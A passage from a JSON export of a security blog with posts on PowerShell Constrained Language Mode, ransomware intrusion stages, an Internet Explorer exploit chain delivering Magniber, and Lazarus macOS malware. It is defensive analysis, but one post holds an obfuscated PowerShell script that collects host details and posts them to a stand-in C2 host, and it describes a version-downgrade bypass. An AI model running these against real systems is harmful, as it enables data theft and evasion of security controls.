releases.\n\nHowever, PowerShell has also been weaponized heavily over the past decade. There is an abundance of PowerShell-based samples all over public sandboxes, and [APTs are known to abuse it whenever possible](https://attack.mitre.org/techniques/T1059/001/). The advanced scripting engine is often utilized to launch fileless/in-memory attacks or [use it as a way around AMSI](https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/). In this post, we will be focusing on a lesser-known feature that can be used to combat this threat: Language Mode.\n\nPowerShell was launched with an option to change its [\"Language Mode\"](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes). This Language Mode option allows the user to switch between syntaxes allowed or disallowed. By default, all PowerShell sessions are launched with `FullLanguage`, which permits all the available syntaxes and cmdlets at runtime. There are four total language modes available: `FullLanguage`, `RestrictedLanguage`, `NoLanguage` and finally `ConstrainedLanguage`. In today's topic, we are here to focus on the `ConstrainedLanguage` mode introduced in PowerShell 3.0.\n\n<br>\n\n### Safer PowerShell Environment\n\nFirst off, let's take a look at what Microsoft Docs says about the `ConstrainedLanguage` mode:\n\n> - All cmdlets in Windows modules, and other UMCI-approved cmdlets, are fully functional and have complete access to system resources, except as noted.\n> - All elements of the PowerShell scripting language are permitted.\n> - All modules included in Windows can be imported and all commands that the modules export run in the session.\n> - In PowerShell Workflow, you can write and run script workflows (workflows written in the PowerShell language). XAML-based workflows are not supported and you cannot run XAML in a script workflow, such as by using Invoke-Expression -Language XAML. Also, workflows cannot call other workflows, although nested workflows are permitted.\n> - The Add-Type cmdlet can load signed assemblies, but it cannot load arbitrary C# code or Win32 APIs.\n> - The New-Object cmdlet can be used only on allowed types (listed below).\n> - Only allowed types (listed below) can be used in PowerShell. Other types are not permitted.\n> - Type conversion is permitted, but only when the result is an allowed type.\n> - Cmdlet parameters that convert string input to types work only when the resulting type is an allowed type.\n> - The ToString() method and the .NET methods of allowed types (listed below) can be invoked. Other methods cannot be invoked.\n> - Users can get all properties of allowed types. Users can set the values of properties only on Core types. Only the following COM objects are permitted:\n>   - Scripting.Dictionary\n>   - Scripting.FileSystemObject\n>   - VBScript.RegExp\n\n<br>\n\n#### No Arbitrary C# Code via Add-Type\n\n> The Add-Type cmdlet can load signed assemblies, but it cannot load arbitrary C# code or Win32 APIs.\n\nMany PowerShell-based exploits rely on .NET-based language compilation via `Add-Type` - and that's already thrown out the window by disallowing arbitrary C# code compilation.\n\n![202101-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230067/202101_1_38111256c4.png)\n\n<br>\n\n#### Non-whitelisted Types are Prohibited\n\n> - The New-Object cmdlet can be used only on allowed types (listed below).\n> - Only allowed types (listed below) can be used in PowerShell. Other types are not permitted.\n> - Type conversion is permitted, but only when the result is an allowed type.\n> - Cmdlet parameters that convert string input to types work only when the resulting type is an allowed type.\n> - The ToString() method and the .NET methods of allowed types (listed below) can be invoked. Other methods cannot be invoked.\n\nIn laymen's terms, every non-whitelisted type and its methods/properties are blocked from execution. Classes such as `System.Reflection.Assembly`/`System.Convert`/`System.Runtime.CompilerServices` and many more are out-of-reach for threat actors, making code injection or fileless attacks that rely on additional PEs much more difficult.\n\n![202101-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_2_ec73ef8561.png)\n\n<br>\n\n### Prohibit Complex Scripts from Executing\n\nGiven the above limitations, this does mean that legitimate complex scripts may not be able to execute correctly. For instance, if your organization uses a script that utilizes WinForm or WPF (Windows Presentation Framework), those will not work at all.\n\n![202101-3.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_3_80ad190a95.png)\n\nConsequentially, modules are affected by this whitelisting system as well. Modules that rely on created types or non-whitelisted type calls will not load properly.\n\n![202101-4.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230067/202101_4_aa876d7833.png)\n\nTherefore, it is crucial to **double-check your organization's scripts** (if you have any) *before* enrolling this policy to your endpoints.\n\n<br>\n\n### Require Explicit Feature Enrollment\n\nSince, by default, this language mode is an opt-in feature, the user would either have to call `$ExecutionContext.SessionState.LanguageMode = \"ConstrainedLanguage\"` at the beginning of each session or add `__PSLockdownPolicy` to the system environment variables (**DO NOT** do this for production. [See the section below](#beware-of-pslockdownpolicy). Neither of which is ideal and should only be used for debugging, unit testing, or for general testing purposes only.\n\nInstead, the administrator(s) of your organization should deploy via WDAC (Windows Defender Application Control) on Windows 10+ *or* via AppLocker on Windows 7+. When implemented this way, the attacker will first have to bypass WDAC or AppLocker before gaining full control of a standard PowerShell session. A guideline regarding the deployment for individual or mass number of endpoints can be found under the [Application Control for Windows](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control) article on Microsoft Docs.\n\n<br>\n\n### Effective Against Scripts, not Standard Cmdlets\n\nIt must be made clear that merely enabling Constrained Language Mode is not enough to mitigate the risks PowerShell can bring. While restricting users to a lower-privileged language mode ensures no custom .NET assemblies or code can be executed, this does not stop attackers from crafting malicious scripts from the built-in cmdlets alone. For example, an attacker may still be able to craft a script that collects relevant intel about the computer and send it back to their C2 station.\n\nThe following, as an example, will continue to run fine under a PowerShell session with Constrained Language mode enabled.\n\n```ps1\nStart-Job -ScriptBlock {\n while($true){\n  # MAC address collection\n  .(\"{1}{3}{2}{0}\" -f 'ariable', 'S', 't-V', 'e') -Name (\"{1}{0}\" -f 'ata', 'd') -Value (.(\"{3}{2}{0}{1}\" -f 'Ada', 'pter', 'Net', 'Get-') | .(\"{1}{0}\" -f 'ect', 'sel') (\"{1}{0}{3}{2}\" -f 'erfac', 'Int', 's', 'eAlia'), (\"{0}{1}{2}\" -f 'MacA', 'd', 'dress') | &(\"{3}{2}{0}{1}\" -f 'r', 'tTo-Json', 'e', 'Conv') -Compress) > $null\n  # OSs + username collection\n  .(\"{2}{0}{1}\" -f '-', 'Variable', 'Set') -Name (\"{0}{1}\" -f 'd', 'ata') -Value (${D`ATa} + (.(\"{0}{2}{3}{1}\" -f 'Ge', 'nce', 't-CimInst', 'a') (\"{1}{0}{3}{2}\" -f 'ting', 'Win32_Opera', 'em', 'Syst') | .(\"{0}{1}\" -f 'se', 'lect') (\"{0}{1}\" -f 'na', 'me'), (\"{1}{0}\" -f 'me', 'CSNa') | &(\"{2}{3}{1}{0}{4}\" -f 'o-Js', 'T', 'Conve', 'rt', 'on') -Compress)) > $null\n  # WAN IP collection\n  &(\"{0}{1}{2}{3}\" -f 'Set-', 'Vari', 'abl', 'e') -Name (\"{1}{0}\" -f 'ta', 'da') -Value (${D`AtA} + ((.(\"{1}{0}\" -f 'r', 'iw') -useb (\"{1}{0}{2}\" -f 'fig', 'ifcon', '.me') -user (\"{0}{1}\" -f 'cur', 'l')).\"cO`NTe`Nt\")) > $null\n  # Saves data to a temporary file (usually this is done in-memory by threat actors, but in-memory execution purely based on existing cmdlets is either impossible or very difficult)\n  .(\"{1}{0}{2}\" -f '-Variabl', 'Set', 'e') -Name ('a') -Value (\"$env:temp\\$(New-Guid).txt\")\n  ${Da`Ta} | &(\"{1}{2}{0}\" -f 'le', 'O', 'ut-Fi') ${a}\n  # Compresses the file\n  &(\"{3}{0}{2}{1}\" -f 'ompr', 'Archive', 'ess-', 'C') -De \"$a.zip\" -Co (\"{0}{1}\" -f 'Op', 'timal') -Lit ${a}\n  # Sends it back to the C2 station\n  &(\"{1}{0}\" -f 'r', 'iw') (\"{0}{2}{3}{4}{1}\" -f 'h', '00', 'ttp://evil', '.tld:', '80') -method (\"{1}{0}\" -f 'st', 'po') -body (.(\"{1}{0}{2}\" -f 'Co', 'Get-', 'ntent') -Lit \"$a.zip\") > $null\n  &(\"{2}{1}{0}\" -f 'leep', 't-S', 'Star') -Seconds 2\n  }\n}\n```\n\nAdditionally, attackers may still be able to call external resources to achieve their goal, such as achieving persistence via `schtask` or placing additional payloads under `shell:startup`. Remember, Constrained Language mode does **NOT** block most existing cmdlets from functioning; in other words, it limits what the threat actor has on their disposal, but does not mean that they cannot make do with vanilla cmdlets or standard Windows applications.\n\n<br>\n\n#### Beware of `__PSLockdownPolicy`\n\nAside from weaponizing existing cmdlets, if the admins had \"enabled\" the language feature via `__PSLockdownPolicy`, then it would be trivial for attackers with administrative privileges to restore the language policy. Let's take a look at what this environment variable actually does.\n\n![202101-5.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_5_707aff90b6.png)\n\nWe'll see that it has brought us to the `SystemPolicy` class under the `wldpNativeMethods.cs` file. In various articles that reference this environment variable, they would instruct the administrator to set the `__PSLockdownPolicy` variable to `4`. A value of 4 corresponds with the `WLDP_LOCKDOWN_UMCIENFORCE_FLAG` constant, which indicates the enforcement of UMCI (User-mode Code Integrity).\n\n![202101-6.gif](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230069/202101_6_2a4f7bdb5c.gif)\n\nThe call's parent method happens to be named `GetDebugLockdownPolicy`, which indicates that this behavior was meant to be a debug feature, rather than something that should be in a production environment.\n\n![202101-7.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230072/202101_7_4f3622def2.png)\n\nThis theory is further backed up by the statement made by [Matt Graeber](https://twitter.com/mattifestation/status/921509830644269062), a renowned security researcher well-versed in WDAC. Further research also shows this behavior was mentioned by the PowerShell team in its [official post regarding Constrained Language Mode as well](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/):\n\n> As part of the implementation of Constrained Language, PowerShell included an environment variable for debugging and unit testing called `__PSLockdownPolicy`. While we have never documented this, some have discovered it and described this as an enforcement mechanism. This is unwise because an attacker can easily change the environment variable to remove this enforcement. In addition, there are also file naming conventions that enable FullLanguage mode on a script, effectively bypassing Constrained Language.\n\nIt must be emphasized that administrators should **NOT** deploy this to their endpoints as a way to enable Constrained Language mode - and be extra mindful when reading through articles regarding security features.\n\n<br>\n\n### Compatibility with Legacy OSs\n\nAnother thing to consider before rolling this feature out to endpoints is legacy OSs. As mentioned at the beginning of this post, Constrained Language mode is only available on PowerShell 3.0 onwards - and Windows 7 ships with PowerShell 2.0 by default.\n\n![202101-8.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230074/202101_8_6103f884e7.png)\n\nWhile it is possible to install WMF 5.1 on older systems such as Windows 7, these systems likely ship with PowerShell 2.0 as its core component as well, which is susceptible to *downgrade attacks*.\n\nAll the attacker needs to do is, instead of starting a standard PowerShell 5.1 session, spawn a PowerShell 2.0 session using `PowerShell.exe -Version 2`. Since `ConstrainedLanguage` mode doesn't exist in that version, it will simply fallback to using `FullLanguage`.\n\n![202101-9.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230075/202101_9_7d51c2552d.png)\n\nThis is much less of a problem on Windows 10, as PowerShell 5.1 is shipped with the system by default and 2.0 can be removed by using `Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root`. After then, any attempts to launch PowerShell v2 will result in an error message.\n\n```text\nPS C:\\> powershell -v 2\nEncountered a problem reading the registry.  Cannot find registry key SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine. The Windows PowerShell 2 engine is not installed on this computer.\n```\n\n<br>\n\n## Hypothetical Testing\n\nTo see how effective this mode is against hypothetical attacks, we ...\n\n- gathered 141 recently-submitted unique PowerShell samples as of Jan 27th, 2021.\n  - These samples were randomly chosen and were not handpicked (aside from picking out invalid samples that aren't `*.ps1` scripts) in any way.\n- executed the scripts via `ls -File | %{start-job -scr {iex $args[0]} -arg $_.FullName}`.\n- ran these samples on a system with `ConstrainedLanguage` mode enabled.\n- ran these samples on a Windows 10 (build 19042) system with a non-elevated PowerShell session.\n  - Elevation is taken out of the equation as attackers would have to escalate its privilege first, and by that point there will be bigger problems to worry about.\n\n![202101-10.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230077/202101_10_0e10676b7f.png)\n\n<br>\n\nIn our testing,\n\n- `ConstrainedLanguage` blocked ...\n  - 100% (141/141) of the samples from executing properly.\n    - ... as in reaching their intended goal of launching a TCP shell, loading its next-stage payload, creating usable persistence, etc.\n  - 51% (72/141) of the samples that had attempted to create a non-whitelisted type.\n  - 50% (71/141) of the samples that had attempted to invoke a method on non-whitelisted type.\n  - 26.9% (38/141) of the samples that had attempted to convert a value into a non-whitelisted type.\n  - 2.8% (4/141) of the samples that had attempted to set a property on a non-whitelisted type.\n- `ConstrainedLanguage` failed to block ...\n  - 0.7% (1/141) of the samples that had managed to create persistence entries.\n\n<br>\n\n## Conclusion\n\nSince PowerShell is now [an integral part](https://support.microsoft.com/en-us/windows/powershell-is-replacing-command-prompt-fdb690cf-876c-d866-2124-21b6fb29a45f) of modern Windows OSs, sysadmins should not underestimate the risks that PowerShell can bring to the organization.\n\nIn the article, we went through the benefits and drawbacks of `ConstrainedLanguage` and how it performs in a hypothetical test. By enabling the engine feature, the risk of PowerShell-introduced exploitation is greatly lowered - if enrolled properly. Organizations should also consider whether or not the reduced availability of modules and or scripts is worth the tradeoff before enrolling this language policy.\n\n<br>\n","__v":0,"id":"6017c9aac56e80003f9859bb"}],"createdAt":"2021-02-01T09:28:10.609Z","updatedAt":"2021-02-17T01:50:50.646Z","__v":1,"author":"5eeae9e3163518003f86d917","topic":"5ecaa004a792d70040a0d8b0","publish_date":"2021-02-17T02:00:00.000Z","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1612249236/pexels_brett_sayles_3803517_1c8f3c2bfa.jpg","id":"6017c9aac56e80003f9859ba"},{"publish":false,"enable_form":false,"tags":["5ecf6cd6fedd7f004b269748","5ece28882e1ee4004aa406f2"],"relative_posts":["5ecaa458a792d70040a0d8b8"],"_id":"601cbb28c56e80003f9859fb","post_url":"test1-c","post_name":"test1","contents":[{"locale":"en","_id":"601cbb28c56e80003f9859fc","title":"test1","context":"test111","__v":0,"id":"601cbb28c56e80003f9859fc"}],"createdAt":"2021-02-05T03:27:36.627Z","updatedAt":"2021-02-05T03:28:42.450Z","__v":1,"author":"5ecb9457c96ab9003fc84906","topic":"5ecaa004a792d70040a0d8b0","id":"601cbb28c56e80003f9859fb"},{"publish":true,"enable_form":false,"tags":["6077eb6d2107530037594a0c","6077eb812107530037594a0d","6077eb8c2107530037594a0e"],"relative_posts":["6059a16cc56e80003f985a6f","60a365f93f9d29004041a487","6098e8e32107530037594ad3","60c196993f9d29004041a4e1","60ebddd53f9d29004041a52f"],"_id":"6077e82e2107530037594a03","post_url":"the-pain-engraved-herein-uncover-scary-ransomware-attacks","post_name":"刻在你我心底的痛！可怕的加密勒索攻擊","contents":[{"locale":"tw","_id":"6077e82e2107530037594a04","context":"圖片來源：[Unsplash](https://unsplash.com/photos/jzTQVxCyKYs?utm_source=unsplash&utm_medium=referral&utm_content=creditShareLink)\n\n<br>\n\n近期國際間不斷發生加密勒索資安事件，受害產業橫跨政府機關、科技製造、交通運輸、軟體開發、衛生醫療、學術研究等。TeamT5 根據情資研究與數起資安事件調查成果，綜整近期針對型加密事件的面貌。\n\n<br>\n\n## 加密勒索攻擊演化\n說到加密勒索攻擊，就不能不談到惡名昭彰的 WannaCry 病毒。WannaCry 病毒在 2017 年造成大規模感染，起因於該病毒針對 SMBv1 漏洞（CVE-2017-0143 ~ CVE-2017-0148）使用永恆之藍（EternalBlue）工具進行入侵。WannaCry 病毒入侵感染第一台主機後，會對主機硬碟和儲存裝置中的各式檔案進行加密，然後再利用 SMBv1 漏洞，主動擴散傳播到其他主機上，進而造成全球超過數百萬台電腦被加密感染。\n\n![2104_1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618468173/2104_1_06555c9aff.png)\n_圖一、WannaCry 加密勒索訊息_\n\n<br>\n\n然而，加密勒索攻擊在近幾年出現質變，逐漸從自動化攻擊轉為由駭客組織躲藏在背後操弄，受害對象也逐漸轉變成大型企業。駭客為避免受害者直接進行系統還原或重建，導致無法有效獲得贖金款項，進而開始竊取受害者的內部機敏資料，並藉由恐嚇公開資料，逼迫受害者繳付贖金。[ZDent](https://www.zdnet.com/article/ransomware-gangs-are-now-cold-calling-victims-if-they-restore-from-backups-without-paying/) 就曾報導 Sekhmet、Maze、Conti 與 Ryuk 等駭客組織存在「催債單位」，會主動與受害者聯繫，威脅若不繳付贖金將公開所竊取的機敏資料。\n\n![2104_2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618468165/2104_2_a31b3d1dd4.png)\n_圖二、常見的針對型加密勒索訊息_\n\n<br>\n\n## 針對型加密勒索\nTeamT5 從情資研究與資安事件成果，歸納目前針對型勒索攻擊分為四大步驟，分別為入侵、水平移動、資料竊取與檔案加密階段。\n\n![2104_3.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618468166/2104_3_82b3ac0151.png)\n_圖三、針對型加密勒索攻擊分解_\n\n<style>\nspan.post-1-dot {\njustify-content: center;\ncolor: #d83751;\nfont-family: initial;\nwidth: 1em;\nfont-size: 22px;\nmargin-right: 12px;\n}\n</style>\n<h3 id=\"compromise\">\n  <span class=\"post-1-dot\">•</span><span>入侵階段</span>\n</h3>\n\n駭客入侵受害環境，主要是透過系統或設備的漏洞與社交郵件兩種管道。根據資安事件調查的結果，駭客所利用的漏洞為 ExChange ProxyLogon（CVE-2021-26858 與 CVE-2021-27065）與 SSL VPN（CVE-2019-11510、CVE-2019-11542、CVE-2019-11539、CVE-2019-11538、CVE-2019-11508、CVE-2019-11540 與 CVE-2019-11507）為主；而社交郵件則會搭配惡意連結，讓使用者點擊後不經意遭植入惡意程式，如 Drive-by-Download 攻擊手法。\n\n![2104_4.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618468166/2104_4_448ef9ff83.png)\n_圖四、駭客利用 IE 漏洞（CVE-2020-0968）搭配 Drive-by-Download 手法植入惡意程式_\n\n<br>\n\n<h3>\n  <span class=\"post-1-dot\">•</span><span>水平移動階段</span>\n</h3>\n\n駭客成功入侵受害環境搶下灘頭堡後，會開始進行後續入侵攻擊（Post-Compromise），目的是為了找到網域伺服器或檔案伺服器等高價值主機。在此階段，駭客會使用 Mimikatz 這類的密碼竊工具取得主機上的帳號密碼，並試著透過各種網路掃描工具，如 nbtscan、TCP Scan 或 ADFind 等駭客工具，找到其他可入侵的內部主機。接下來，駭客會嘗試使用先前取得的帳號密碼登入，其登入方式包含廣為人知的 PsExec 工具程式，最後在受害主機上建立後門程式，以便駭客長期連入控制之用，近期常見的後門程式多為使用 Cobalt Strike 框架建立 Stager 或 Beacon 等後門管道。\n\n![2104_5.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618468165/2104_5_9b984c5e4c.png)\n_圖五、登入驗證程式 lsass.exe 遭到 Mimikatz 注入並竊取帳號密碼_\n\n<br>\n\n![2104_6.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618471005/2104_6_bba2dd7079.png)\n_圖六、駭客透過 Powershell 執行惡意語法植入 Cobalt Strike Stager_\n\n<br>\n\n<h3>\n  <span class=\"post-1-dot\">•</span><span>資料竊取階段</span>\n</h3>\n\n\n駭客成功入侵至網域伺服器或檔案伺服器主機後，會嘗試從中取得受害單位內部的機敏資料，如產品開發、客戶資訊、財務資訊等機敏檔案。下圖七為 TeamT5 於某事件中偵測到駭客利用 WinRAR 壓縮工具，試圖遠端加密壓縮特定資料夾內容。\n\n![2104_7.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618468165/2104_6_3c1ab71659.png)\n_圖七、駭客正在加密壓縮機敏資料_\n\n<br>\n\n<h3>\n  <span class=\"post-1-dot\">•</span><span>檔案加密階段</span>\n</h3>\n\n當駭客成功取得受害者內部的機敏資料後，才會肆無忌憚地開始進行大規模主機加密行動。根據 TeamT5 實地調查的案例，駭客會在各主機植入加密程式，等到取得機敏資料後才透過 AD GPO 大量且快速地執行檔案加密攻擊，且駭客開始採用合法的檔案加密程式進行惡意加密攻擊。如下圖畫面，攻擊者早在 7 月就已植入加密程式，但是等到 12 月才發動加密攻擊，代表攻擊潛伏期長達數個月之久。且駭客所使用的加密程式 bcl.exe 為 Jetico 公司所開發的商用資料加密軟體，該軟體本意是為了達到資料隱私保護之用，卻被駭客利用成為加密勒索攻擊的一環。\n\n![2104_8.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618468166/2104_7_98ce84dfb8.png)\n_圖八、長達數個月潛伏期的加密勒索攻擊行動_\n\n<br>\n\n## 轉換一下您的防禦思維\n看到現在，各位應該發現針對型加密勒索攻擊是個細膩且漫長的攻擊行動，為了不打草驚蛇讓受害者早早發現，駭客開始使用許多合法商用軟體替代自行開發的惡意程式。在許多防禦機制都在強調如何阻斷檔案加密的當下，卻忽略了我們有數周至數個月的時間可以發現駭客的潛在威脅，又或是如果駭客使用合法程式來掩護非法攻擊，該如何有效偵測及識別，乃至於阻擋呢？\n\n或許我們該轉換一下防禦思維，如果能在駭客入侵初期的潛伏階段就能有效識別，進而修補漏洞、清除惡意程式，阻斷駭客持續控制內部受害環境，便能避免未來發生大規模檔案加密的攻擊。\n\n更多加密勒索攻擊防護，敬請期待 TeamT5 在 [CYBERSEC 2021 臺灣資安大會](https://teamt5.org/tw/posts/cybersec-2021/)上即將獨家公開的全新升級威脅捕網！\n\n<br>\n","title":"刻在你我心底的痛！可怕的加密勒索攻擊","__v":0,"id":"6077e82e2107530037594a04"}],"createdAt":"2021-04-15T07:15:58.752Z","updatedAt":"2021-07-21T03:50:11.026Z","__v":1,"publish_date":"2021-04-19T02:30:00.000Z","author":"5eeae43e163518003f86d914","topic":"5ecaa004a792d70040a0d8b0","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1618836826/ransomware_7387136e6c.jpg","id":"6077e82e2107530037594a03"},{"publish":true,"enable_form":false,"tags":["60ebe0043f9d29004041a536","60ebe0263f9d29004041a537","6010ed99c56e80003f9859b1"],"relative_posts":["6098e8e32107530037594ad3","6077e82e2107530037594a03"],"_id":"60ebddd53f9d29004041a52f","post_url":"internet-explorer-the-vulnerability-ridden-browser","post_name":"「勒」此不疲，IE 真調皮","contents":[{"locale":"tw","_id":"60ebddd53f9d29004041a530","title":"「勒」此不疲，IE 真調皮","context":"By Tom, Peter & Jason3e7 | 圖片來源：[Pixabay](https://pixabay.com/illustrations/browser-web-www-computer-773273/)\n\n近期全球籠罩在勒索軟體的威脅下，大到法人企業、小至個人用戶，無一倖免。從針對式的 APT 攻擊（Advanced Persistent Threat，進階持續性攻擊）到各式網路犯罪組織，使用的勒索手法越發精湛與多樣化，並發展出 Ransomware as a Service（RaaS）商業模式，實現了「一時勒索一時爽，一直勒索一直爽」的勒索大業。\n\n本次分析的案例，攻擊手法屬於較被動的方式，透過微軟瀏覽器 IE （Internet Explorer）的弱點來進行勒索，而非從企業的脆弱點進行攻擊，進而入侵到核心系統大量散布勒索軟體。這種「願者上鉤」的攻擊方式，攻擊者等待受害單位使用 IE 瀏覽器造訪惡意網站，再發動攻擊、達成目的。\n\n## 技術分析\n\ntenki[.]tw 早期是用來提供氣象資訊的網站，根據我們的研究，推測可能遭攻擊者註冊，當使用者造訪該網站時，將進行兩次轉址，經過兩個廣告公司網站後，最終轉至惡意網站，流程如下圖。\n\n![IE_1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073503/IE_1_9c89756204.png)\n\n\n<br>\n\n其中 {random}.doetax.site 包含以下已經過程式碼混淆（Obfuscation）的 JavaScript：\n\n![IE_2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073503/IE_2_75720d835e.png)\n\n<br>\n\n經過解碼還原後，可以確定攻擊 payload 會使用 URL 進行 XOR，再使用 execScript 來執行編碼過的 JavaScript，如下圖：\n\n![IE_3.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073501/IE_3_7834571d0f.png)\n\n<br>\n\n該編碼過的 JavaScript 使用的是 CVE-2020-0968 來針對 IE 瀏覽器進行攻擊。\n\n![IE_4.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073500/IE_4_d1df7d6427.png)\n\n<br>\n\n執行惡意程式碼後，攻擊者會再依據取得的權限不同，將使用者連線到不同的網址，如下圖：\n\n![IE_5.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073500/IE_5_8167c3864c.png)\n\n<br>\n\n若取得是高權限，則會直接到 hxxp://1fbw726f22j65y.doetax.site/ 取得勒索軟體，否則會先到 hxxp://2oct37evecvdw72y0b.doetax.site/ 下載惡意程式，提權後連線到 hxxp://1fbw726f22j65y.doetax.site/  取得勒索軟體，如下圖所示。\n\n![IE_6.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073497/IE_6_8cf56ced86.png)\n\n<br>\n\n經分析後確定勒索軟體為 Magniber，該惡意程式使用 AES CBC mode 加密檔案（key, IV: 128），加密完成後，會使用 RSA 演算法加密 key 與 IV，加密後的 blob 會放在加密檔案的最後面（長度：100h）。\n\n![IE_7.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073496/IE_7_8d674f100c.png)\n\n![IE_8.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073493/IE_8_b0ab9e49b9.png)\n\n<br>\n\n另外我們也發現，除了使用 CVE-2020-0968 來攻擊外，也有使用 CVE-2021-26411 進行勒索攻擊的情境。\n\n![IE_9.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073491/IE_9_a0a080b8f8.png)\n\n![IE_10.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073491/IE_10_36fdab639d.png)\n\n<br>\n\n我們進一步探討網站轉址狀況可以發現，攻擊者會利用免費資源網站來吸引使用者瀏覽，同時利用一透明框架覆蓋於網站上，讓使用者點擊，進而達成轉址目的。\n\n![IE_11.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073490/IE_11_080a2e35e5.png)\n\n<br>\n\n轉跳後的網站如下圖：\n\n<br>\n\n![IE_12.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073490/IE_12_9549f3a339.png)\n\n<br>\n\n雖然該網站並不會植入勒索軟體，但會使用 CVE-2019-1367 弱點來植入其他的後門，另外，雖然在 IE11、IE10 和 IE9 使用 Jscript9.dll，並不受 CVE-2019-1367 漏洞的影響，但可以強制 IE 使用 IE8 兼容模式，來達成漏洞的觸發。\n\n![IE_13.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073490/IE_13_9dff2ee47b.png)\n\n![IE_14.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073491/IE_14_247f61ede7.png)\n\n\n## 結論\n上述案例皆為採證 IE 的連線紀錄後所發現，攻擊者透過 IE 瀏覽器的漏洞來達到攻擊目的，包含勒索或者植入其他後門程式。攻擊者透過這些弱點進行記憶體操作的攻擊，可以有效實踐無檔案式（Fileless）攻擊，以利規避一些資安產品偵測的可能性。\n\n微軟官方也預計於 2022 年 6 月 25 日，徹底終止支援 IE 瀏覽器，接下來我們也可以預期，若 IE 將來仍被發現存在重大弱點時，攻擊者可能會依循類似手法，大量進行攻擊、勒索，以達到其商業利益。\n\n## 建議\n- 建議將系統安全性更新至最新版本\n- 建議評估汰換已停止更新的作業系統與軟體\n- 非必要不使用 IE 瀏覽器\n\n## 參考資料\n[1] https://asec.ahnlab.com/en/19273/\n\n[2] https://asec.ahnlab.com/en/21189/\n\n<br>\n","__v":0,"id":"60ebddd53f9d29004041a530"}],"createdAt":"2021-07-12T06:14:45.795Z","updatedAt":"2021-07-21T03:50:11.030Z","__v":1,"topic":"5ecaa004a792d70040a0d8b0","author":"60ebdf963f9d29004041a534","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1626072162/browser_773273_1920_860892cf7d.jpg","publish_date":"2021-07-21T03:30:00.000Z","id":"60ebddd53f9d29004041a52f"}],"id":"5ecaa004a792d70040a0d8b0"},"banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1597026081/brina-blum-Bb_X4JgSqIM-unsplash_8163042d8a.jpg","id":"5f301d4c163518003f86da78"}],"_id":"5fd1cef79f8bdc004a7fdf4a","post_url":"north-korea-linked-lazarus-apt-uses-a-macos-malware-in-cryptocurrency-exchange-attack","post_name":"macOS 用戶當心！北韓駭客 Lazarus 將目標瞄準虛擬貨幣交易用戶","publish_date":"2020-12-22T01:00:00.000Z","contents":[{"locale":"tw","_id":"5fd1cef89f8bdc004a7fdf4b","context":"圖片來源：[Pixabay](https://pixabay.com/illustrations/the-company-cryptocurrency-mining-3338207/)\n\n## 摘要\nTeamT5 近期掌握情資，北韓 APT 駭客 Lazarus 開發出 macOS 作業系統的惡意程式 MovieRAT，並試圖攻擊虛擬貨幣的使用者，藉此盜取帳戶內的虛擬貨幣。\n\n## 技術分析\nTeamT5 透過情資管道取得惡意樣本（53d9af8829a9c7f6f177178885901c01），其檔案名稱為 Esilet.dmg，是 macOS 的第三方應用程式安裝檔，如圖一所示。該樣本執行後，會連線至 esilet.com 網站，該網站為虛擬貨幣交易平台，但經過 TeamT5 深入追查後發現，esilet.com 於 2020 年 6 月 12 日註冊，因此可以確認為駭客近期所發動的攻擊行為，如圖二所示。\n\n![2020-12-1](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607910258/2020-12-1_38f3073f52.png)\n_圖一、Esilet.dmg 執行畫面_\n\n<br>\n\n![2020-12-2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909875/2020-12-2_61901a7ea4.png)\n_圖二、esilet.com 網域註冊時間_\n\n<br>\n\nesilet.com 是駭客特意架設的虛擬貨幣交易網站，並透過該網站的應用程式下載安裝連結來散佈惡意程式。根據網站的支援語系，推測駭客攻擊標的為英、法、德及中文的虛擬貨幣用戶，如圖三所示。\n\n<br>\n\n![2020-12-3](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909876/2020-12-3_c882e11ea8.png)\n_圖三、esilet.com 支援英、法、德及中文語系_\n\n<br>\n\nEsilet.dmg 執行後，會和中繼站連線獲取 config，config 